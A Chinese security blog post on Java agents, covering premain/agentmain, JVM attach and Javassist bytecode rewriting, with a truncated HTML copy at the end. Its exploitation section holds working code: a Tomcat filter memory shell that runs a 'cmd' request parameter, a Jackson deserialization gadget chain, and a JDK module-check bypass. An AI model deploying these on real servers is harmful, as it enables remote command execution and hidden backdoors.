public static void premain(String args, Instrumentation inst) {\n        for (int i=0 ; i<10 ; i++){\n            System.out.println(\"调用了premain-Agent！\");\n        }\n    }\n}\n```\n\nAgent.mf \n\n```\nManifest-Version: 1.0\nPremain-Class: Java_Agent_premain\n```\n\n然后 生成我们的 premain agent\n\n`jar cvfm agent.jar META-INF/maven/agent.MF Java_Agent_premain.class`\n\n\n\n相应的我们准备一个 hello.jar\n\n```java\npublic class Hello {\n    public static void main(String[] args) {\n        System.out.println(\"hello\");\n    }\n}\n```\n\nhello.mf\n\n```\nManifest-Version: 1.0\nMain-Class: Hello\n```\n\njar cvfm hello.jar META-INF/maven/hello.mf Hello.class\n\n\n\n然后其实可以发现我们的Java_Agent_premain 是运行Hello之前的。\n\n这个premain-Agent是在jvm启动前加载的。\n\n```\njava -javaagent:agent.jar -jar hello.jar\n调用了premain-Agent！\n调用了premain-Agent！\n调用了premain-Agent！\n调用了premain-Agent！\n调用了premain-Agent！\n调用了premain-Agent！\n调用了premain-Agent！\n调用了premain-Agent！\n调用了premain-Agent！\n调用了premain-Agent！\nHello World!\n```\n\n## VirtualMachine\n\n先说一下环境，引入 tool.jar\n\n```xml\n<dependency>\n  <groupId>com.sun</groupId>\n  <artifactId>tools</artifactId>\n  <version>1.8.0</version>\n  <scope>system</scope>\n  <systemPath>/Library/Java/JavaVirtualMachines/jdk8u275/lib/tools.jar</systemPath>\n</dependency>\n```\n\n\n\n`com.sun.tools.attach.VirtualMachine`类可以实现获取JVM信息，内存dump、现成dump、类信息统计（例如JVM加载的类）等功能。\n\n比如这个 获取特定虚拟机PID\n\n```java\npublic class get_PID {\n    public static void main(String[] args) {\n        List<VirtualMachineDescriptor> list = VirtualMachine.list();\n        for(VirtualMachineDescriptor vmd : list){\n            //遍历每一个正在运行的JVM，如果JVM名称为get_PID则返回其PID\n            if(vmd.displayName().equals(\"com.drunkbaby.get_PID\"))\n                System.out.println(vmd.id()); \n        }\n    }\n}\n```\n\n\n\n## agentmain-Agent\n\npremain-Agent是在 JVM 启动前加载的,这个agentmain是 JVM 启动之后加载的。\n\n先编写一个 `Sleep_Hello` 类，模拟正在运行的 JVM\n\n```java\npackage com.drunkbaby;  \n  \nimport static java.lang.Thread.sleep;  \n  \npublic class Sleep_Hello {  \n    public static void main(String[] args) throws InterruptedException {  \n        while (true){  \n            System.out.println(\"Hello World!\");  \n            sleep(5000);  \n        }  \n    }  \n}\n```\n\n编写我们的 agentmain\n\n```java\npublic class Java_Agent_agentmain {\n    public static void agentmain(String args, Instrumentation inst) throws InterruptedException {\n        while (true){\n            System.out.println(\"调用了agentmain-Agent!\");\n            sleep(3000);\n        }\n    }\n}\n```\n\nmf文件\n\n```\nManifest-Version: 1.0\nAgent-Class: com.drunkbaby.Java_Agent_agentmain\n```\n\njar cvfm hello.jar META-INF/MAINFEST.MF Java_Agent_agentmain.class\n\n\n\n然后开始注入\n\n```java\npublic class Inject_Agent {\n    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException {\n        //调用VirtualMachine.list()获取正在运行的JVM列表\n        List<VirtualMachineDescriptor> list = VirtualMachine.list();\n        for(VirtualMachineDescriptor vmd : list){\n            //遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent\n            if(vmd.displayName().equals(\"com.drunkbaby.Sleep_Hello\")){\n\n                //连接指定JVM\n                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());\n                //加载Agent\n                virtualMachine.loadAgent(\"/Users/taoyu/Music/code/java_code/Java-Agent-Memshell/Agentmain/src/main/resources/hello.jar\");\n                //断开JVM连接\n                virtualMachine.detach();\n            }\n        }\n    }\n}\n```\n\n先运行Sleep_Hello再运行Inject_Agent。输出如下。\n\n```\nHello World!\n调用了agentmain-Agent!\nHello World!\n调用了agentmain-Agent!\n调用了agentmain-Agent!\n```\n\n \n\n> 但是这里我们这里只是插入，而不是改变。\n\n## 动态修改字节码 \n\nInstrumentation 是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent 通过这个类和目标 JVM 进行交互，从而达到修改数据的效果。\n\nClassFileTransformer接口下面有一个addTransformer方法。重写该方法即可转换任意类文件，并返回新的被取代的类文件，\n\n\n\n下面我们来修改这个正在运行的hello\n\n```java\npublic class Sleep_Hello {\n    public static void main(String[] args) throws InterruptedException {\n        while(true) {\n            hello();\n            sleep(3000);\n        }\n    }\n    public static void hello(){\n        System.out.println(\"Hello World!\");\n    }\n}\n```\n\n\n\n一个实现了ClassFileTransformer接口的类。\n\n```java\npublic class Hello_Transform implements ClassFileTransformer {\n\n    @Override\n    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {\n        try {\n            //获取CtClass 对象的容器 ClassPool\n            ClassPool classPool = ClassPool.getDefault();\n            //添加额外的类搜索路径\n            if (classBeingRedefined != null) {\n                ClassClassPath ccp = new ClassClassPath(classBeingRedefined);\n                classPool.insertClassPath(ccp);\n            }\n            //获取目标类\n            CtClass ctClass = classPool.get(\"AgentShell.Sleep_Hello\");\n            System.out.println(ctClass);\n            //获取目标方法\n            CtMethod ctMethod = ctClass.getDeclaredMethod(\"hello\");\n            //设置方法体\n            String body = \"{System.out.println(\\\"Hacker!\\\");}\";\n            ctMethod.setBody(body);\n            //返回目标类字节码\n            byte[] bytes = ctClass.toBytecode();\n            return bytes;\n        }catch (Exception e){\n            e.printStackTrace();\n        }\n        return null;\n    }\n}\n```\n\nagent \n\n```java\npublic class agentmain_transform {\n    public static void agentmain(String args, Instrumentation inst) throws InterruptedException, UnmodifiableClassException {\n        Class [] classes = inst.getAllLoadedClasses();\n\n        //获取目标JVM加载的全部类\n        for(Class cls : classes){\n            if (cls.getName().equals(\"AgentShell.Sleep_Hello\")){\n\n                //添加一个transformer到Instrumentation，并重新触发目标类加载\n                inst.addTransformer(new Hello_Transform(),true);\n                inst.retransformClasses(cls);\n            }\n        }\n    }\n}\n```\n\n修改一下mf文件\n\n```\nManifest-Version: 1.0\nAgent-Class: AgentShell.agentmain_transform\nCan-Redefine-Classes: true\nCan-Retransform-Classes: true\n```\n\npom.xml  这里使用assembly生成说需要的jar包\n\n```xml\n<build>\n  <plugins>\n    <plugin>\n      <groupId>org.apache.maven.plugins</groupId>\n      <artifactId>maven-assembly-plugin</artifactId>\n      <version>2.6</version>\n      <configuration>\n        <descriptorRefs>\n          <descriptorRef>jar-with-dependencies</descriptorRef>\n        </descriptorRefs>\n        <archive>\n          <manifestFile>\n            src/main/resources/META-INF/maven/MAINFEST.MF\n          </manifestFile>\n        </archive>\n      </configuration>\n    </plugin>\n    <plugin>\n      <groupId>org.apache.maven.plugins</groupId>\n      <artifactId>maven-compiler-plugin</artifactId>\n      <configuration>\n        <source>6</source>\n        <target>6</target>\n      </configuration>\n    </plugin>\n  </plugins>\n</build>\n```\n\n\n\n先运行Sleep_Hello 再运行这个\n\n```java\npublic class Inject_Agent {\n    public static void main(String[] args) throws Exception {\n        //调用VirtualMachine.list()获取正在运行的JVM列表\n        List<VirtualMachineDescriptor> list = VirtualMachine.list();\n        for(VirtualMachineDescriptor vmd : list){\n            System.out.println(vmd.displayName());\n            //遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent\n            if(vmd.displayName().equals(\"AgentShell.Sleep_Hello\")){\n                //连接指定JVM\n                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());\n                //加载Agent\n                virtualMachine.loadAgent(\"/Users/taoyu/Music/code/java_code/Java-Agent-Memshell/Instrumentation/target/Instrumentation-1.0-SNAPSHOT-jar-with-dependencies.jar\");\n                //断开JVM连接\n                virtualMachine.detach();\n            }\n        }\n    }\n}\n```\n\n\n\n```\nHello World!\nHello World!\nHello World!\nHello World!\nHello World!\nHello World!\njavassist.CtClassType@6ae33825[public class AgentShell.Sleep_Hello fields= constructors=javassist.CtConstructor@58966603[public Sleep_Hello ()V],  methods=javassist.CtMethod@44a4fe33[public static main ([Ljava/lang/String;)V], javassist.CtMethod@30063153[public static hello ()V], ]\nHacker!\nHacker!\n```\n\n\n\n# 一些利用\n\n## 利用agentmain注入Filter内存马\n\n准备好实现了ClassFileTransformer接口的Filter_Transform\n\n```java\npublic class Filter_Transform implements ClassFileTransformer {\n    @Override\n    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {\n        try {\n\n            //获取CtClass 对象的容器 ClassPool\n            ClassPool classPool = ClassPool.getDefault();\n\n            //添加额外的类搜索路径\n            if (classBeingRedefined != null) {\n                ClassClassPath ccp = new ClassClassPath(classBeingRedefined);\n                classPool.insertClassPath(ccp);\n            }\n\n            //获取目标类\n            CtClass ctClass = classPool.get(\"org.apache.catalina.core.ApplicationFilterChain\");\n\n            //获取目标方法\n            CtMethod ctMethod = ctClass.getDeclaredMethod(\"doFilter\");\n\n            //设置方法体\n            String body = \"{\" +\n                    \"javax.servlet.http.HttpServletRequest request = $1\\n;\" +\n                    \"String cmd=request.getParameter(\\\"cmd\\\");\\n\" +\n                    \"if (cmd !=null){\\n\" +\n                    \"  Runtime.getRuntime().exec(cmd);\\n\" +\n                    \"  }\"+\n                    \"}\";\n            ctMethod.setBody(body);\n\n            //返回目标类字节码\n            byte[] bytes = ctClass.toBytecode();\n            return bytes;\n\n        }catch (Exception e){\n            e.printStackTrace();\n        }\n        return null;\n    }\n}\n```\n\n准备agent\n\n```java\npublic class agentmain_transform {\n    public static void agentmain(String args, Instrumentation inst) throws InterruptedException, UnmodifiableClassException {\n        Class [] classes = inst.getAllLoadedClasses();\n\n        //获取目标JVM加载的全部类\n        for(Class cls : classes){\n            if (cls.getName().equals(\"org.apache.catalina.core.ApplicationFilterChain\")){\n\n                //添加一个transformer到Instrumentation，并重新触发目标类加载\n                inst.addTransformer(new Filter_Transform(),true);\n                inst.retransformClasses(cls);\n            }\n        }\n    }\n}\n```\n\nmf文件\n\n```\nManifest-Version: 1.0\nAgent-Class: com.drunkbaby.agentmain_transform\nCan-Redefine-Classes: true\nCan-Retransform-Classes: true\n```\n\n生成对应jar包,然后开始注入\n\n```java\npublic class Inject_Agent {\n    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException {\n        //调用VirtualMachine.list()获取正在运行的JVM列表\n        List<VirtualMachineDescriptor> list = VirtualMachine.list();\n        for(VirtualMachineDescriptor vmd : list){\n            System.out.println(vmd.displayName());\n            //遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent\n            if(vmd.displayName().contains(\"JavaAgentSpringBootApplication\")){\n\n                //连接指定JVM\n                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());\n                //加载Agent\n                virtualMachine.loadAgent(\"/Users/taoyu/Music/code/java_code/Java-Agent-Memshell/AgentInjectionExample/target/AgentInjectionExample-1.0-SNAPSHOT-jar-with-dependencies.jar\");\n                //断开JVM连接\n                virtualMachine.detach();\n            }\n\n        }\n    }\n}\n```\n\n注入成功。\n\n![image-20241120183255665](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241120183255665.png)\n\n## Jackson删除writeReplace方法\n\n说到这个链子，我们都知道需要删除BaseJsonNode的writeReplace方法。但是我们其实可以在premain的时候就把这件事情给做了。\n\n```java\nObject template = Gadgets.createTemplatesImpl(\"open -a Calculator\");\n\nCtClass ctClass = ClassPool.getDefault().get(\"com.fasterxml.jackson.databind.node.BaseJsonNode\");\nCtMethod writeReplace = ctClass.getDeclaredMethod(\"writeReplace\");\nctClass.removeMethod(writeReplace);\nctClass.toClass();\n\nPOJONode jsonNodes = new POJONode(template);\nBadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);\nReflections.setFieldValue(badAttributeValueExpException, \"val\", jsonNodes);\n\nSystem.out.println(Tool.base64Encode(Tool.serialize(badAttributeValueExpException)));\n```\n\ntransform\n\n```java\npublic class JacksonClassFileTransformer implements ClassFileTransformer {\n\n    @Override\n    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer){\n        String target1 = \"com.fasterxml.jackson.databind.node.BaseJsonNode\";\n        String className2 = className.replace(\"/\", \".\");\n        if (className2.equals(target1)) {\n            System.out.println(\"Find the Inject Class: \"+target1);\n            ClassPool pool = ClassPool.getDefault();\n            try {\n                CtClass c = pool.getCtClass(className2);\n                CtMethod ctMethod = c.getDeclaredMethod(\"writeReplace\");\n                c.removeMethod(ctMethod);\n                byte[] bytes = c.toBytecode();\n                c.detach();\n                return bytes;\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n        return new byte[0];\n    }\n\n}\n```\n\nagent\n\n```java\npublic class JacksonAgent {\n    public static void premain(String agentArgs, Instrumentation inst) throws UnmodifiableClassException {\n\n        inst.addTransformer(new JacksonClassFileTransformer(),true);\n        Class[] allLoadedClasses = inst.getAllLoadedClasses();\n\n        for (Class loadedClass : allLoadedClasses) {\n            if(\"com.fasterxml.jackson.databind.node.BaseJsonNode\".equals(loadedClass.getName())){\n                //重新transform\n                inst.retransformClasses(loadedClass);\n            }\n        }\n    }\n}\n```\n\n.mf\n\n```\nManifest-Version: 1.0\nCan-Redefine-Classes: true\nCan-Retransform-Classes: true\nPremain-Class: cn.org.unk.JacksonAgent\n```\n\n然后我们生成对应的jar包。\n\n然后我们需要让项目运行的时候加上这样一个参数.带上我们的premain agent。\n\n`-javaagent:/Users/taoyu/Music/code/java_code/Java-useful-agent/Java17/target/Java17-premain.jar`\n\nRun->edit configurations\n\n![image-20241120183210072](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241120183210072.png)\n\n然后我们构造链子的好时候就可以将以下代码删除依旧不影响我们poc的构造\n\n```\nCtClass ctClass = ClassPool.getDefault().get(\"com.fasterxml.jackson.databind.node.BaseJsonNode\");\nCtMethod writeReplace = ctClass.getDeclaredMethod(\"writeReplace\");\nctClass.removeMethod(writeReplace);\nctClass.toClass();\n```\n\n\n\n## 高版本jdk反射修改私有属性\n\ndk9出现了module机制：https://zhuanlan.zhihu.com/p/640217638\n\n\n\njava.xml是module的名字，不一定要和包名一样。\n\nexports表示外部可以访问当前module的哪些package。\n\nexports…to 表示指定该package只能被哪些package访问。\n\n同一个module下的类可以互相访问。\n\n\n\n我们以这个链子为例。\n\nEventListenerList ReadObject -> ToString\n\n```java\nPerson p = new Person(\"aaa\");\nEventListenerList list = new EventListenerList();\n\nUndoManager manager = new UndoManager();\nVector vector = (Vector) getFieldValue(manager, \"edits\");\nvector.add(p);\nsetFieldValue(list, \"listenerList\", new Object[]{InternalError.class, manager});\n\nbyte[] code = serialize(list);\nunserialize(code);\n```\n\nPerson\n\n```java\npublic String toString() {\n    System.out.println(\"this is tostring\");\n}\n```\n\n我们正常情况下调用私有属性的时候。下面这个 flag值为true。\n\n```java\npublic void setAccessible(boolean flag) {\n    AccessibleObject.checkPermission();\n    if (flag) checkCanSetAccessible(Reflection.getCallerClass());\n    setAccessible0(flag);\n}\n```\n\n会爆以下错误。但是我们如果设置一个premain，就可以修改这段代码。让flag恒为flase。这样我们就可以setAccessible来进行各种操作了。\n\n```\nException in thread \"main\" java.lang.reflect.InaccessibleObjectException: Unable to make field protected java.util.Vector javax.swing.undo.CompoundEdit.edits accessible: module java.desktop does not \"opens javax.swing.undo\" to unnamed module @60d14f0f\n\tat java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:354)\n\tat java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:297)\n\tat java.base/java.lang.reflect.Field.checkCanSetAccessible(Field.java:178)\n```\n\n\n\n```java\npublic class MyClassFileTransformer implements ClassFileTransformer {\n\n    @Override\n    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer){\n\n        String target4 = \"java.lang.reflect.Field\";\n        String className2 = className.replace(\"/\", \".\");\n\n        if (className2.equals(target4)) {\n            System.out.println(\"Find the Inject Class: \"+target4);\n            ClassPool pool = ClassPool.getDefault();\n            try {\n\n                CtClass c = pool.getCtClass(className2);\n                System.out.println(\"hhhh\");\n                CtMethod ctMethod = c.getDeclaredMethod(\"setAccessible\");\n\n                ctMethod.setBody(\"{        java.lang.reflect.AccessibleObject.checkPermission();\\n\" +\n                        \"        if (false) checkCanSetAccessible(Reflection.getCallerClass());\\n\" +\n                        \"        setAccessible0($1);}\");\n                byte[] bytes = c.toBytecode();\n                c.detach();\n                return bytes;\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n        return new byte[0];\n    }\n\n}\n```\n\n\n\n```java\npublic class MyAgent {\n\n    public static void premain(String agentArgs, Instrumentation inst) throws UnmodifiableClassException {\n\n        inst.addTransformer(new MyClassFileTransformer(),true);\n        Class[] allLoadedClasses = inst.getAllLoadedClasses();\n\n        for (Class loadedClass : allLoadedClasses) {\n            if(\"java.lang.reflect.Field\".equals(loadedClass.getName())){\n                //重新transform\n                inst.retransformClasses(loadedClass);\n            }\n        }\n    }\n}\n```\n\n\n\n## 高版本JDK反射类加载\n\n由于高版本的module机制，\n\n无法反射调用 TemplatesImpl 的get方法，POJONode的toString -> 到任意get 的这种方法也没有办法用。\n\n但是我们可以修改Method 的 setAccessible也修改一下我们就可以了。但是需要让服务端加载这个permain时不太现实的。\n\n但是我们可以通过agentmain进行修改，但是有那种功夫，我们还不如注入内存马。直接拿shell。\n\n\n\n把上面的那个agent 的 Filed改成Method就可以了。\n这样的这个恶意类在jdk17的环境下依旧是可以被加载的。\n\n```java\nbyte[] bytes = Files.readAllBytes(Paths.get(\"target/classes/Evil.class\"));\n\nMethod method = ClassLoader.class.getDeclaredMethod(\"defineClass\", String.class, byte[].class, int.class, int.class);\nmethod.setAccessible(true);\n((Class)method.invoke(ClassLoader.getSystemClassLoader(), \"Evil\", bytes, 0, bytes.length)).newInstance();\n\n```\n\n\n\n\n\n\n\n\n","slug":"javaAgent","published":1,"date":"2025-01-05T16:11:03.701Z","updated":"2025-01-05T16:11:03.701Z","_id":"cm5jsi9eh0000az9p5mce3mw0","comments":1,"layout":"post","photos":[],"content":"<h1 id=\"Agent基本认识\"><a href=\"#Agent基本认识\" class=\"headerlink\" title=\"Agent基本认识\"></a>Agent基本认识</h1><p>Agent（代理）来讲，其大致可以分为两种，一种是在 JVM 启动前加载的<code>premain-Agent</code>，另一种是 JVM 启动之后加载的 <code>agentmain-Agent</code>。这里我们可以将其理解成一种特殊的 Interceptor（拦截器）</p>\n<h2 id=\"premain-Agent\"><a href=\"#premain-Agent\" class=\"headerlink\" title=\"premain-Agent\"></a>premain-Agent</h2><p>首先我们先定义这样一个 agent.jar</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Java_Agent_premain</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">premain</span><span class=\"params\">(String args, Instrumentation inst)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i=<span class=\"number\">0</span> ; i&lt;<span class=\"number\">10</span> ; i++)&#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;调用了premain-Agent！&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Agent.mf </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Manifest-Version: 1.0</span><br><span class=\"line\">Premain-Class: Java_Agent_premain</span><br></pre></td></tr></table></figure>\n\n<p>然后 生成我们的 premain agent</p>\n<p><code>jar cvfm agent.jar META-INF/maven/agent.MF Java_Agent_premain.class</code></p>\n<p>相应的我们准备一个 hello.jar</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Hello</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;hello&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>hello.mf</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Manifest-Version: 1.0</span><br><span class=\"line\">Main-Class: Hello</span><br></pre></td></tr></table></figure>\n\n<p>jar cvfm hello.jar META-INF&#x2F;maven&#x2F;hello.mf Hello.class</p>\n<p>然后其实可以发现我们的Java_Agent_premain 是运行Hello之前的。</p>\n<p>这个premain-Agent是在jvm启动前加载的。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -javaagent:agent.jar -jar hello.jar</span><br><span class=\"line\">调用了premain-Agent！</span><br><span class=\"line\">调用了premain-Agent！</span><br><span class=\"line\">调用了premain-Agent！</span><br><span class=\"line\">调用了premain-Agent！</span><br><span class=\"line\">调用了premain-Agent！</span><br><span class=\"line\">调用了premain-Agent！</span><br><span class=\"line\">调用了premain-Agent！</span><br><span class=\"line\">调用了premain-Agent！</span><br><span class=\"line\">调用了premain-Agent！</span><br><span class=\"line\">调用了premain-Agent！</span><br><span class=\"line\">Hello World!</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"VirtualMachine\"><a href=\"#VirtualMachine\" class=\"headerlink\" title=\"VirtualMachine\"></a>VirtualMachine</h2><p>先说一下环境，引入 tool.jar</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>com.sun<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>tools<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>1.8.0<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">scope</span>&gt;</span>system<span class=\"tag\">&lt;/<span class=\"name\">scope</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">systemPath</span>&gt;</span>/Library/Java/JavaVirtualMachines/jdk8u275/lib/tools.jar<span class=\"tag\">&lt;/<span class=\"name\">systemPath</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p><code>com.sun.tools.attach.VirtualMachine</code>类可以实现获取JVM信息，内存dump、现成dump、类信息统计（例如JVM加载的类）等功能。</p>\n<p>比如这个 获取特定虚拟机PID</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">get_PID</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(VirtualMachineDescriptor vmd : list)&#123;</span><br><span class=\"line\">            <span class=\"comment\">//遍历每一个正在运行的JVM，如果JVM名称为get_PID则返回其PID</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span>(vmd.displayName().equals(<span class=\"string\">&quot;com.drunkbaby.get_PID&quot;</span>))</span><br><span class=\"line\">                System.out.println(vmd.id()); </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"agentmain-Agent\"><a href=\"#agentmain-Agent\" class=\"headerlink\" title=\"agentmain-Agent\"></a>agentmain-Agent</h2><p>premain-Agent是在 JVM 启动前加载的,这个agentmain是 JVM 启动之后加载的。</p>\n<p>先编写一个 <code>Sleep_Hello</code> 类，模拟正在运行的 JVM</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.drunkbaby;  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"keyword\">static</span> java.lang.Thread.sleep;  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Sleep_Hello</span> &#123;  </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> InterruptedException &#123;  </span><br><span class=\"line\">        <span class=\"keyword\">while</span> (<span class=\"literal\">true</span>)&#123;  </span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;Hello World!&quot;</span>);  </span><br><span class=\"line\">            sleep(<span class=\"number\">5000</span>);  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>编写我们的 agentmain</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Java_Agent_agentmain</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">agentmain</span><span class=\"params\">(String args, Instrumentation inst)</span> <span class=\"keyword\">throws</span> InterruptedException &#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (<span class=\"literal\">true</span>)&#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;调用了agentmain-Agent!&quot;</span>);</span><br><span class=\"line\">            sleep(<span class=\"number\">3000</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>mf文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Manifest-Version: 1.0</span><br><span class=\"line\">Agent-Class: com.drunkbaby.Java_Agent_agentmain</span><br></pre></td></tr></table></figure>\n\n<p>jar cvfm hello.jar META-INF&#x2F;MAINFEST.MF Java_Agent_agentmain.class</p>\n<p>然后开始注入</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span 